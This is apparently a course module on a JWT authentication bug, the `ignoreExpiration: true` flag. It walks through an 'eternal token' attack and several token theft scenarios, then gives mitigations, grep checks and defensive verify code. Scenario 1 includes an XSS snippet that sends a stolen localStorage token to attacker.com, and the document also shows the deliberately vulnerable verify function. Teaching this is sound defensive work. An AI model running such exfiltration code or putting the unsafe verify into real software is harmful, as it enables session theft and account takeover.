# M07: JWT Auth — Bug Deep Dive

## Bug: `ignoreExpiration: true`

### The Vulnerable Code

```typescript
import jwt from 'jsonwebtoken';

export function verifyTokenUnsafe(token: string) {
  return jwt.verify(token, JWT_SECRET, {
    ignoreExpiration: true,  // 🔴 NEVER DO THIS IN PRODUCTION
  });
}
```

### Why It Exists

Developers sometimes set this during:
- Local development ("tokens keep expiring while I debug")
- Testing environments ("I want long-lived test tokens")
- Migration scripts ("old tokens need to keep working")

Then they forget to remove it before deploying to production.

---

## The Attack: Eternal Tokens

### Step 1: Attacker Obtains a Token

An attacker phishes a user, finds a token in a log file, or exfiltrates one via XSS.

**Token issued:**
```json
{
  "sub": "user-42",
  "role": "admin",
  "iat": 1609459200,
  "exp": 1609460100
}
```

This token was supposed to expire in 15 minutes (`exp` = 2021-01-01 00:15:00).

### Step 2: Time Passes

Three years later (2024), the attacker finds this token in an old backup or database dump.

### Step 3: The Bug Activates

With `ignoreExpiration: true`, the server accepts this token:

```typescript
const payload = verifyTokenUnsafe(stolenToken);
// payload = { sub: "user-42", role: "admin", iat: 1609459200, exp: 1609460100 }
// No error thrown despite 2021 < 2024
```

The attacker now has **permanent admin access** to the system. Even if the user changed their password, the JWT remains valid because JWTs are not bound to password state.

---

## JWT Theft Scenarios

### Scenario 1: XSS Exfiltration from localStorage

```javascript
// Attacker's script injected via unsanitized comment field
const jwt = localStorage.getItem('access_token');
fetch(`https://attacker.com/collect?jwt=${encodeURIComponent(jwt)}`);
```

**Impact:** Attacker receives the token and can impersonate the user until expiry (or forever, with `ignoreExpiration`).

**Mitigation:** httpOnly cookies prevent JavaScript from reading the token.

### Scenario 2: Log File Leak

```typescript
// Bad logging
logger.info(`User request: ${JSON.stringify(req.headers)}`);
// Logs: {"authorization":"Bearer eyJhbG..."}
```

If logs are stored in plaintext and an attacker gains read access (e.g., via LFI or compromised SIEM), they harvest valid tokens.

**Mitigation:** Never log bearer tokens. If you must log auth events, log only user IDs and token metadata (jti, exp).

### Scenario 3: Man-in-the-Middle on HTTP

If the API accepts HTTP (not HTTPS), a network-level attacker can intercept the `Authorization` header.

```
GET /api/account/balance HTTP/1.1
Host: api.example.com
Authorization: Bearer eyJhbGci...
```

**Mitigation:** Enforce HTTPS everywhere. Use HSTS headers. Reject HTTP requests at the load balancer.

### Scenario 4: Browser History / Referrer Leak

If the JWT is passed as a URL parameter:
```
https://api.example.com?token=eyJhbGci...
```

The token appears in:
- Browser history
- Server access logs
- Referrer headers when clicking external links

**Mitigation:** Never pass JWTs in URLs. Use headers or cookies.

---

## Detection and Prevention

### Code Review Checklist

```bash
# Search for the dangerous flag
grep -r "ignoreExpiration" src/
grep -r "ignoreNotBefore" src/
grep -r "clockTimestamp" src/   # Can be used to fake time
```

### Runtime Defense

```typescript
// Defense-in-depth: always check exp manually even if library should do it
export function verifyToken(token: string) {
  const payload = jwt.verify(token, JWT_SECRET, {
    algorithms: ['HS256'],
  }) as JWTPayload;

  const now = Math.floor(Date.now() / 1000);
  if (payload.exp && payload.exp < now) {
    throw new Error('Token expired');
  }

  if (payload.iat && payload.iat > now + 60) {
    throw new Error('Token issued in future');
  }

  return payload;
}
```

### Infrastructure Defense

1. **Short expiry:** 15 minutes for access tokens
2. **Explicit revocation:** Maintain a Redis blocklist of `jti` values
3. **Key rotation:** Rotate signing keys quarterly; maintain a key version in the JWT header for smooth transitions
4. **Monitoring:** Alert on token usage patterns (same token from two different IPs within 1 second = possible theft)
